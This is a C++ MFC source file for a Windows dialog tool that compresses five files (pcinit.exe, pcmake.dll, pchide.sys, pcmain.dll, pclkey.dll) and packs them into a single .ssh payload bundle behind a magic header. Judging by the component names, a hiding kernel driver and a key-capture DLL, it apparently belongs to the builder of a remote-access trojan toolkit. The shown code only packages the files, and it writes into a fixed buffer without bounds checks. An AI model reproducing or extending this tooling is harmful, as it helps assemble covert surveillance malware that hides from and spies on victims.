// PcFileCombDlg.cpp : implementation file
//

#include "stdafx.h"
#include "PcFileComb.h"
#include "PcFileCombDlg.h"
#include "Lzw.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CPcFileCombDlg dialog

CPcFileCombDlg::CPcFileCombDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CPcFileCombDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CPcFileCombDlg)
	m_Value = _T("");
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CPcFileCombDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CPcFileCombDlg)
	DDX_Text(pDX, IDC_EDIT_PATH, m_Value);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CPcFileCombDlg, CDialog)
	//{{AFX_MSG_MAP(CPcFileCombDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON_PATH, OnButtonPath)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcFileCombDlg message handlers

BOOL CPcFileCombDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CPcFileCombDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CPcFileCombDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CPcFileCombDlg::OnButtonPath() 
{
	CXTBrowseDialog dlg;
	dlg.SetTitle(_T("指定UPDATE目录"));
	if(dlg.DoModal() != IDOK)
	{
		return;
	}
	m_Value = dlg.GetSelPath();
	UpdateData(FALSE);	
}

BOOL CPcFileCombDlg::GetMySource(TCHAR* pFileName, BYTE* pFileData, UINT* pFileLen)
{
	CFile m_File;
	if(!m_File.Open(pFileName, CFile::modeRead))
	{
		return FALSE;
	}
	DWORD nFileLen = m_File.GetLength();
	BYTE* pSrcData = new BYTE[nFileLen];
	m_File.Read(pSrcData, nFileLen);
	m_File.Close();

	FCLzw lzw;
	lzw.PcZip(pSrcData, pFileData, &nFileLen);
	*pFileLen = nFileLen;
	delete [] pSrcData;
	return TRUE;
}

void CPcFileCombDlg::OnOK() 
{
	UpdateData();
	if(m_Value.IsEmpty())
	{
		return;
	}

	BYTE* pDllFileData = new BYTE[1024 * 8192];
	memset(pDllFileData, 0, 1024 * 8192);
	LPSYSFILEINFO pFileInfo = (LPSYSFILEINFO) pDllFileData;
	pFileInfo->nVerifyFlag = 0x59983712;
	BYTE* pTmpData = pDllFileData + sizeof(SYSFILEINFO);
	
	//pcinit.exe
	char m_FileName[256] = {0};
	sprintf(m_FileName, "%s\\pcinit.exe", m_Value);
	if(!GetMySource(m_FileName, pTmpData, &pFileInfo->nExeFileLen))
	{
		delete [] pDllFileData;
		MessageBox("找不到pcinit.exe");
		return;
	}
	pTmpData += pFileInfo->nExeFileLen;

	//pcmake.dll
	sprintf(m_FileName, "%s\\pcmake.dll", m_Value);
	if(!GetMySource(m_FileName, pTmpData, &pFileInfo->nDllFileLen))
	{
		delete [] pDllFileData;
		MessageBox("找不到pcmake.dll");
		return;
	}
	pTmpData += pFileInfo->nDllFileLen;

	//pchide.sys
	sprintf(m_FileName, "%s\\pchide.sys", m_Value);
	if(!GetMySource(m_FileName, pTmpData, &pFileInfo->nSysFileLen))
	{
		delete [] pDllFileData;
		MessageBox("找不到pchide.sys");
		return;
	}
	pTmpData += pFileInfo->nSysFileLen;

	//pcmain.dll
	sprintf(m_FileName, "%s\\pcmain.dll", m_Value);
	if(!GetMySource(m_FileName, pTmpData, &pFileInfo->nModFileLen))
	{
		delete [] pDllFileData;
		MessageBox("找不到pcmain.dll");
		return;
	}
	pTmpData += pFileInfo->nModFileLen;

	//pclkey.dll
	sprintf(m_FileName, "%s\\pclkey.dll", m_Value);
	if(!GetMySource(m_FileName, pTmpData, &pFileInfo->nKeyFileLen))
	{
		delete [] pDllFileData;
		MessageBox("找不到pclkey.dll");
		return;
	}

	OPENFILENAME OpenFileName = {0};
	TCHAR szFile[MAX_PATH] = {0};
	TCHAR szFileName[MAX_PATH] = {0};
  	TCHAR szFilter[1024] = {0};
	lstrcpy(szFilter, _T("(*.ssh)"));
	lstrcpy(szFilter + lstrlen(szFilter) + 1, _T("*.ssh"));
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
	OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = szFileName;
    OpenFileName.nMaxFileTitle     = sizeof(szFileName);
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("保存到文件");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = _T("*");
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
	if(!GetSaveFileName(&OpenFileName))
	{
		delete [] pDllFileData;
		return;
	}
	
	//插件
	CFile m_File;
	if(!m_File.Open(szFile, CFile::modeWrite|CFile::modeCreate))
	{
		return;
	}
	m_File.Write(pDllFileData, sizeof(SYSFILEINFO) + 
		pFileInfo->nExeFileLen + pFileInfo->nDllFileLen + 
		pFileInfo->nSysFileLen + pFileInfo->nModFileLen + pFileInfo->nKeyFileLen);
	m_File.Close();
}
